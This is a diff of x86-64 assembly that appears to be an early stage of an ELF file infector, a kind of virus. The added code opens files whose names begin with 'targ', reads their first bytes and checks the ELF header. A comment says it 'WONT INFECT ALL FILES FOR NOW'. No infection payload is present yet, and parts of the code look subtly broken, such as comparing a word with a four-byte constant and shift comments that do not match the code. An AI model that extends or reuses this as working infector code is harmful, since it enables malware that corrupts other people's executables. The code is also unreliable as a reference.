@@ -29,6 +29,44 @@ global _start
 
 section .text
 
+analyse:
+	; # PROLOGUE
+	; # STACK
+	push rbp ; PUSH rbp IN STACK SO WE CAN KEEP A BACKUP OF OLD STACK BASE ADDRESS
+	mov rbp, rsp ; ALIGN RBP TO RSP
+	; # EPILOGUE
+	mov rdi, rax ; fd
+	mov rax, 0 ; READ KERNEL CODE
+	; ; MAKE SPACE FOR BUFFER
+	sub rsp, 8
+	mov rsi, rsp
+	mov rdx, 8 ; READ 8 BYTES
+	syscall ;
+	;	0x7F	|	'E'	|	'L'	|	'F'	|	2 (64bits)
+	;	0			1		2		3	|	4
+	; # MUST CHECK FIRST 5 BYTES
+	cmp rax, 8 ; TO BE SURE WE HAVE ENOUGH BYTES
+	jne _badFile
+	; mov rdi, qword[rsp]
+	mov rax, qword[rsp] ; GET FIRST 8 BYTES FROM BUFFER
+						;			0x00 01 01 02 46 4c 45 7f
+	shl rax, 12 ; SHIFT ADD 3 0 BYTES SO WE REACH 64BITS AND NEXT BITS WILL BE ERASED
+				; ->				0x10 10 24 64 c4 57 f0 00
+	shl rax, 12 ; ERASE 3x CHAR SO	0x02 46 4c 45 7f 00 00 00
+	mov rdi, rax
+	; mov rax, 0x0000007F454C4602 ; WE USE RAX FOR 64bits OPERATIONS
+	mov rax, 0x02464c457f000000
+	cmp rdi, rax
+	jne _badFile
+	call _debugPrint
+
+	; # STACK
+
+_badFile:
+	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
+	pop rbp ; CLEAN THE STACK, REMOVE OUR RBP BACKUP NOW THAT WE REASSIGNED IT
+	ret ;
+
 open_file:
 	; # PROLOGUE
 	; # STACK
@@ -40,12 +78,21 @@ open_file:
 	mov rax, 2 ; OPEN KERNEL CODE
 	mov rdi, rdx ; PATHNAME
 	mov rsi, 0 ; O_RDONLY
+	cmp word[rdi], 0x67726174 ; TESTING PURPOSES, WONT INFECT ALL FILES FOR NOW
+							  ; CHECKING FOR BEGINNING "targ" IN FILENAME
+	jne _prologue ; IF NOT "target" FILE, SKIP
 	syscall
+	; # ANALYSE FILE
+	push rax
+	call analyse
+	; #
 	; # CLOSE
+	pop rax
 	mov rdi, rax
 	mov rax, 3
 	syscall
 
+_prologue: ; # FOR TESTING ON TARGET, CONDITIONAL JUMP
 	; # EPILOGUE
 	; # STACK
 	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
@@ -161,20 +208,13 @@ _start:
 	mov rax, 60
 	mov rdi, 0
 	syscall
+
+_debugPrint:
 	; #### DEBUG_PRINT #####
-	push rsi
-	push rax
-	push rdi
-	push rdx
-	push rcx
-	mov rsi, rdx
+	push 0x484848
+	lea rsi, [rsp]
 	mov rax, 1
 	mov rdi, 1
-	mov rdx, 7
+	mov rdx, 3
 	syscall
-	pop rcx
-	pop rdx
-	pop rdi
-	pop rax
-	pop rsi
 	; ####################
